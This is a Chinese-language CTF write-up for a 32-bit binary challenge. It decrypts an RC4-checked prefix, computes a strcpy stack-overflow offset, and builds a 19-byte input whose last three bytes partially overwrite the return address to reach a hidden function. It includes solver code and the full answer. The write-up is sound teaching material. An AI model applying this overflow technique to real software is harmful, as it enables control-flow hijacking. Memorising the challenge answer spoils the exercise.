# SU_BBRE_WP

## 题目简述

原仓库把本题放在 `rev` 赛道，附件也只提供 32 位 x86 反汇编文本；但最终必须利用 `strcpy` 栈溢出覆盖返回地址、跳入正常流程不可达的隐藏函数，因此按决定性利用原语归入 Pwn。

程序第一阶段只读取最多 19 个非空白字符，先用密钥 `suctf` 做 RC4 并与 16 字节常量比较，随后把同一输入复制到 4 字节局部数组。要让程序进入隐藏的 `function1()`，第一阶段输入必须同时满足 RC4 校验和返回地址覆盖；隐藏函数再校验第二段 9 字节输入。

## 解题过程

第一段校验的等价逻辑为：

```c
unsigned char expected[16] = {
    0x2f, 0x5a, 0x57, 0x65,
    0x14, 0x8f, 0x69, 0xcd,
    0x93, 0x29, 0x1a, 0x55,
    0x18, 0x40, 0xe4, 0x5e
};

rc4("suctf", input, 16);
if (memcmp(input, expected, 16) != 0)
    exit(0);
```

RC4 加解密相同，可以直接解出前 16 字节：

```python
def rc4(data, key):
    box = list(range(256))
    j = 0
    for i in range(256):
        j = (j + box[i] + key[i % len(key)]) & 0xff
        box[i], box[j] = box[j], box[i]

    out = bytearray()
    i = j = 0
    for byte in data:
        i = (i + 1) & 0xff
        j = (j + box[i]) & 0xff
        box[i], box[j] = box[j], box[i]
        out.append(byte ^ box[(box[i] + box[j]) & 0xff])
    return bytes(out)

expected = bytes.fromhex(
    "2f5a5765148f69cd93291a551840e45e"
)
prefix = rc4(expected, b"suctf")
print(prefix)  # b"We1com3ToReWorld"
```

`function0()` 的栈帧中，目标数组位于 `ebp-0xc`：

```asm
function0:
    push ebp
    mov  ebp, esp
    sub  esp, 0x18
    ...
    lea  eax, [ebp-0xc]
    push src
    push eax
    call strcpy
    leave
    ret
```

保存的返回地址位于 `ebp+4`，所以从数组起点到返回地址的偏移是：

$$
(ebp+4)-(ebp-0xc)=0x10.
$$

RC4 校验恰好要求前 16 字节为 `We1com3ToReWorld`，它们完整填满返回地址之前的区域。隐藏函数 `function1()` 地址为：

```text
0x0040223d
```

32 位小端序为：

```text
3d 22 40 00
```

前 3 个非零字节对应 ASCII：

| 字节 | 字符 |
|---|---|
| `0x3d` | `=` |
| `0x22` | `"` |
| `0x40` | `@` |

也就是字节串 `b'="@'`。

主函数使用 `scanf("%19s", input)`，正好读入 16 字节前缀和 3 字节地址低位，再自动补一个 `\0`。因此第一阶段发送：

```text
We1com3ToReWorld="@
```

内存中的返回地址就成为 `3d 22 40 00`，控制流转到 `function1()`。

隐藏函数保存的 9 字节常量为：

```python
check = bytes([
    0x41, 0x6d, 0x62, 0x4d, 0x53,
    0x49, 0x4e, 0x29, 0x28
])
```

验证关系是：

```c
input2[i] - i == check[i];
```

所以第二段逐字节加上下标即可：

```python
second = bytes((value + i) & 0xff for i, value in enumerate(check))
print(second)  # b"AndPWNT00"
```

完整交互为：

```python
io.sendlineafter(b"please input your flag:", b'We1com3ToReWorld="@')
io.sendlineafter(b"hhh,you find me:", b"AndPWNT00")
io.recvuntil(b"congratulate!!!")
```

官方材料记录的完整答案为：

```text
We1com3ToReWorld="@AndPWNT00
```

其中第一段末尾的 `="@` 同时承担返回地址低三字节，第二段才是隐藏函数实际读取的内容。

## 方法总结

本题把“正确数据”和“利用载荷”安排在同一 19 字节输入中。前 16 字节必须通过 RC4 比较，恰好又是到保存返回地址的覆盖距离；后 3 字节利用 `%19s` 自动追加的空字节，构造出 No PIE 程序中的 `0x0040223d`。

处理字符串型部分覆盖时，必须同时检查输入函数长度、是否自动补零、目标地址的高字节和端序。这里若手工再发送第四个 `\0`，反而会超出 `%19s` 的可见输入长度；真正把地址最高字节清零的是 `scanf` 的字符串终止符。隐藏函数中的第二段只是线性关系，逐字节按 `input2[i]=constant[i]+i` 反解即可。
